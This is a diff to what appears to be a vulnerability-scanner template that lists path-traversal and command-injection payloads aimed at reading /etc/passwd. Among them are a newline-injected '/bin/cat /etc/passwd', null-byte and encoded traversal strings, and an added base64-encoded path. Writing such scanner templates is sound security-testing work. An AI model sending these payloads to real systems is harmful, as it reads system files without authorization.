@@ -45,7 +45,7 @@ requests:
         - '%0a/bin/cat%20/etc/passwd'
         - '%00/etc/passwd%00'
         - '%00../../../../../../etc/passwd'
-        - '/../../../../../../../../../../../etc/passwd%00.jpg'
+        - 'L2V0Yy9wYXNzd2Q='
         - '/../../../../../../../../../../../etc/passwd%00.html'
         - '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd'
         - '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
